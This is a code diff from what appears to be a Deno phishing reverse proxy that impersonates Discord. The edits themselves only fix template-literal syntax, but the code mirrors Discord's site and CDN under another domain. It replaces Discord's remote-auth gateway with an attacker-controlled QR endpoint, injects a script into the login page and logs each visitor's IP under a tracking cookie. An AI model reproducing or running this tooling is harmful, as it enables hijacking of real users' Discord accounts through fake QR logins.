@@ -3,8 +3,8 @@ import { domain, fakeQr, fullDomain, qrCodeEndpoint, hostingOnVPS } from './conf
 import middleware, { formatUrl } from './middleware.ts';
 import { createSession, getSessionFromCookie } from './sessions.ts';
 
-const reverseRegex = new RegExp(https?://${domain}, 'g');
-const reverseDomainRegex = new RegExp(${domain}, 'g');
+const reverseRegex = new RegExp(`https?://${domain}`, 'g');
+const reverseDomainRegex = new RegExp(`${domain}`, 'g');
 const cdnId = '/_cdn';
 
 const ignoreExtensions = ['woff2', 'jpg', 'png', 'gif', 'svg', 'webp', 'mp4', 'webm'];
@@ -31,11 +31,11 @@ async function handler(req: Request, connInfo: ConnInfo): Promise<Response> {
 	if (session.ip != newIp) {
 		session.ip = newIp;
 		session.location = undefined;
-		console.log([${session.id}] IP: ${session.ip});
+		console.log(`[${session.id}] IP: ${session.ip}`);
 	}
 
 	const path = req.url.replace(fullDomain, '');
-	console.log([${session.id}] ${req.method} ${path});
+	console.log(`[${session.id}] ${req.method} ${path}`);
 
 	let headers = new Headers(req.headers);
 
@@ -71,7 +71,7 @@ async function handler(req: Request, connInfo: ConnInfo): Promise<Response> {
 	}
 
 	const resp = await fetch(
-		${cdn ? 'https://cdn.discordapp.com' : 'https://' + target}${await formatUrl(session, cdn ? path.substring(cdnId.length) : path, headers.get('user-agent') || undefined)},
+		`${cdn ? 'https://cdn.discordapp.com' : 'https://' + target}${await formatUrl(session, cdn ? path.substring(cdnId.length) : path, headers.get('user-agent') || undefined)}`,
 		{
 			headers: headers,
 			method: req.method,
@@ -115,7 +115,7 @@ async function handler(req: Request, connInfo: ConnInfo): Promise<Response> {
 				text = text.replace('remote-auth-gateway.discord.gg', qrCodeEndpoint);
 				if (fakeQr && path.includes('/login')) {
 					const file = await Deno.readFile('/qrcode/inject.js');
-					text += <script>${new TextDecoder().decode(file)}</script>;
+					text += `<script>${new TextDecoder().decode(file)}</script>`;
 				}
 			} catch (e) {
 				console.error(e);
@@ -135,7 +135,7 @@ async function handler(req: Request, connInfo: ConnInfo): Promise<Response> {
 	if (!path.includes('.')) {
 		headers.append(
 			'set-cookie',
-			dsess=${session.id}; Path=/; Domain=${domain}; ${fullDomain.startsWith('https') ? 'SameSite=None; Secure; ' : ''}Expires=Sun, 17-Jan-2038 19:14:07 GMT;
+			`dsess=${session.id}; Path=/; Domain=${domain}; ${fullDomain.startsWith('https') ? 'SameSite=None; Secure; ' : ''}Expires=Sun, 17-Jan-2038 19:14:07 GMT;`
 		);
 	}
 
